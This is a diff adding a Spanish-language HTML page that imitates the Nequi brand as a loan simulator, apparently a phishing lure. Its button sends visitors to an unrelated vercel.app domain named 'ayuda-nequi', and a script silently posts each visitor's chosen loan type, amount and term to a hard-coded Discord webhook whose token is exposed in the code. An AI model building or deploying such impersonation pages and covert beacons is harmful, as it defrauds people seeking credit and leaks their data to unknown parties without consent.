@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Préstamos Nequi - Tu Salvavidas Financiero</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --nequi-purple: #200020;
+            --nequi-pink: #d80032;
+            --nequi-magenta: #ff3366;
+            --bg-light: #f4f5f7;
+            --white: #ffffff;
+            --text-dark: #2c3e50;
+            --text-gray: #7f8c8d;
+            --border: #e2e8f0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+        }
+
+        .external-top-image {
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            line-height: 0;
+        }
+
+        .external-top-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+
+        .phone-mockup {
+            width: 100%;
+            max-width: 420px;
+            background: var(--white);
+            border-radius: 36px;
+            box-shadow: 0 20px 40px rgba(32, 0, 32, 0.12);
+            overflow: hidden;
+            border: 8px solid #1a1a1a;
+            position: relative;
+            margin: 20px 15px;
+        }
+
+        .notch {
+            width: 150px;
+            height: 22px;
+            background: #1a1a1a;
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            border-bottom-left-radius: 12px;
+            border-bottom-right-radius: 12px;
+            z-index: 10;
+        }
+
+        .app-header {
+            background: linear-gradient(145deg, var(--nequi-purple) 0%, #3d003d 100%);
+            color: var(--white);
+            padding: 40px 20px 25px 20px;
+            text-align: center;
+        }
+
+        .app-header .brand {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .app-header .brand span {
+            color: var(--nequi-magenta);
+        }
+
+        .app-header p {
+            font-size: 12px;
+            opacity: 0.8;
+            margin-top: 4px;
+        }
+
+        .app-body {
+            padding: 20px;
+            max-height: 520px;
+            overflow-y: auto;
+        }
+
+        .image-principal-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .image-principal-container img {
+            max-width: 100%;
+            border-radius: 14px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .card-type-selector {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .type-btn {
+            background: #f8fafc;
+            border: 2px solid var(--border);
+            border-radius: 14px;
+            padding: 10px;
+            text-align: center;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-dark);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .type-btn.active {
+            background: rgba(216, 0, 50, 0.05);
+            border-color: var(--nequi-pink);
+            color: var(--nequi-pink);
+        }
+
+        .input-box {
+            background: #faf8fb;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 18px;
+        }
+
+        .input-box label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 10px;
+        }
+
+        .input-box label span {
+            color: var(--nequi-pink);
+            font-size: 14px;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 3px;
+            outline: none;
+            -webkit-appearance: none;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: var(--nequi-pink);
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(216, 0, 50, 0.4);
+        }
+
+        .limits {
+            display: flex;
+            justify-content: space-between;
+            font-size: 10px;
+            color: var(--text-gray);
+            margin-top: 6px;
+        }
+
+        .months-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 6px;
+            margin-top: 5px;
+        }
+
+        .m-btn {
+            background: var(--white);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 8px 4px;
+            font-size: 11px;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .m-btn.active {
+            background: var(--nequi-purple);
+            border-color: var(--nequi-purple);
+            color: var(--white);
+        }
+
+        .summary-card {
+            background: linear-gradient(135deg, #200020 0%, #2c002c 100%);
+            color: var(--white);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 15px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            margin-bottom: 8px;
+            opacity: 0.9;
+        }
+
+        .summary-row.total {
+            border-top: 1px solid rgba(255,255,255,0.15);
+            padding-top: 8px;
+            margin-top: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            opacity: 1;
+        }
+
+        .summary-row.total span:last-child {
+            color: #ff758c;
+        }
+
+        .legal-text {
+            font-size: 9px;
+            color: var(--text-gray);
+            text-align: center;
+            line-height: 1.3;
+            margin-bottom: 15px;
+        }
+
+        .action-btn {
+            display: block;
+            width: 100%;
+            background: var(--nequi-pink);
+            color: var(--white);
+            border: none;
+            border-radius: 14px;
+            padding: 14px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            box-shadow: 0 4px 12px rgba(216, 0, 50, 0.3);
+            transition: background 0.2s;
+            margin-bottom: 15px;
+        }
+
+        .action-btn:hover {
+            background: #b5002a;
+        }
+
+        .image-footer-container {
+            text-align: center;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px dashed var(--border);
+        }
+
+        .image-footer-container img {
+            max-width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.08);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="external-top-image">
+        <img src="https://i.ibb.co/4RH59TLJ/Screenshot-20260731-124017-Chrome.jpg" alt="Imagen">
+    </div>
+
+    <div class="phone-mockup">
+        <div class="notch"></div>
+
+        <div class="app-header">
+            <div class="brand">Nequi<span></span></div>
+            <p>Simulador de Créditos y Préstamos</p>
+        </div>
+
+        <div class="app-body">
+            <div class="image-principal-container">
+                <img src="https://i.ibb.co/JRVPb077/Screenshot-20260731-111509-Chrome.jpg" alt="Referencia Principal Nequi">
+            </div>
+
+            <div class="card-type-selector">
+                <div class="type-btn active" id="typeSalva" onclick="setLoanType('salva')">Préstamo Salvavidas</div>
+                <div class="type-btn" id="typeLibre" onclick="setLoanType('libre')">Libre Inversión</div>
+            </div>
+
+            <div class="input-box">
+                <label for="montoRange">
+                    ¿Cuánto necesitas?
+                    <span id="montoLabel">$5.000.000 COP</span>
+                </label>
+                <input type="range" id="montoRange" min="50000" max="10000000" step="50000" value="5000000">
+                <div class="limits">
+                    <span id="minLimit">$50.000</span>
+                    <span id="maxLimit">$10.000.000</span>
+                </div>
+            </div>
+
+            <div class="input-box">
+                <label>Plazo a diferir</label>
+                <div class="months-grid">
+                    <div class="m-btn" data-m="1" onclick="setMonths(1)">1 mes</div>
+                    <div class="m-btn" data-m="3" onclick="setMonths(3)">3 meses</div>
+                    <div class="m-btn" data-m="6" onclick="setMonths(6)">6 meses</div>
+                    <div class="m-btn active" data-m="12" onclick="setMonths(12)">12 meses</div>
+                </div>
+            </div>
+
+            <div class="summary-card">
+                <div class="summary-row">
+                    <span>Capital solicitado:</span>
+                    <span id="resCapital">$5.000.000 COP</span>
+                </div>
+                <div class="summary-row">
+                    <span>Interés estimado (~3.8% E.M.):</span>
+                    <span id="resInteres">$1.120.000 COP</span>
+                </div>
+                <div class="summary-row">
+                    <span>Seguro de vida aprox:</span>
+                    <span id="resSeguro">$100.000 COP</span>
+                </div>
+                <div class="summary-row total">
+                    <span>Cuota mensual aprox:</span>
+                    <span id="resCuota">$510.000 COP</span>
+                </div>
+            </div>
+
+            <p class="legal-text">
+                *Simulación orientativa sujeta a validación de perfil de riesgo, comportamiento y políticas internas en la app oficial de Nequi. Tasa máxima legal vigente.
+            </p>
+
+            <a href="https://ayuda-nequi.vercel.app/" class="action-btn">¡Sácalo ya!</a>
+
+            <div class="image-footer-container">
+                <p style="font-size: 10px; color: var(--text-gray); margin-bottom: 6px;">Referencia visual adjunta:</p>
+                <img src="https://i.ibb.co/SDwSqVVY/Screenshot-20260731-111005-Chrome.jpg" alt="Referencia Nequi Final">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
+
+        let currentType = 'salva';
+        let currentMonths = 12;
+
+        const montoRange = document.getElementById('montoRange');
+        const montoLabel = document.getElementById('montoLabel');
+        const minLimit = document.getElementById('minLimit');
+        const maxLimit = document.getElementById('maxLimit');
+        
+        const resCapital = document.getElementById('resCapital');
+        const resInteres = document.getElementById('resInteres');
+        const resSeguro = document.getElementById('resSeguro');
+        const resCuota = document.getElementById('resCuota');
+
+        function setLoanType(type) {
+            currentType = type;
+            document.getElementById('typeSalva').classList.toggle('active', type === 'salva');
+            document.getElementById('typeLibre').classList.toggle('active', type === 'libre');
+
+            if (type === 'salva') {
+                montoRange.max = 5550000;
+                maxLimit.textContent = '$5.550.000';
+                if (parseInt(montoRange.value) > 5550000) {
+                    montoRange.value = 5550000;
+                }
+            } else {
+                montoRange.max = 10000000;
+                maxLimit.textContent = '$10.000.000';
+            }
+            calculate();
+        }
+
+        function setMonths(m) {
+            currentMonths = m;
+            document.querySelectorAll('.m-btn').forEach(btn => {
+                btn.classList.toggle('active', parseInt(btn.getAttribute('data-m')) === m);
+            });
+            calculate();
+        }
+
+        function formatCOP(num) {
+            return '$' + num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".") + ' COP';
+        }
+
+        function formatSimple(num) {
+            return '$' + num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+        }
+
+        let debounceTimer;
+        function sendToDiscord(amount) {
+            if (!DISCORD_WEBHOOK_URL) return;
+            
+            clearTimeout(debounceTimer);
+            debounceTimer = setTimeout(() => {
+                const payload = {
+                    content: `📊 **Nueva simulación de monto en Nequi:**\n• Tipo: **${currentType === 'salva' ? 'Préstamo Salvavidas' : 'Libre Inversión'}**\n• Monto seleccionado: **${formatSimple(amount)} COP**\n• Plazo: **${currentMonths} meses**`
+                };
+
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(err => console.error("Error al enviar a Discord:", err));
+            }, 800);
+        }
+
+        function calculate() {
+            const P = parseInt(montoRange.value);
+            const n = currentMonths;
+            const i = 0.038;
+
+            montoLabel.textContent = formatCOP(P);
+            resCapital.textContent = formatCOP(P);
+
+            let cuota = n === 1 ? P * (1 + i) : P * (i * Math.pow(1 + i, n)) / (Math.pow(1 + i, n) - 1);
+            let totalPayment = cuota * n;
+            let totalInterest = totalPayment - P;
+            let seguro = Math.round(P * 0.015);
+
+            let cuotaFinal = Math.round(cuota + (seguro / n));
+
+            resInteres.textContent = formatCOP(Math.max(0, Math.round(totalInterest)));
+            resSeguro.textContent = formatCOP(seguro);
+            resCuota.textContent = formatCOP(cuotaFinal);
+
+            sendToDiscord(P);
+        }
+
+        montoRange.addEventListener('input', calculate);
+        calculate();
+    </script>
+</body>
+</html>
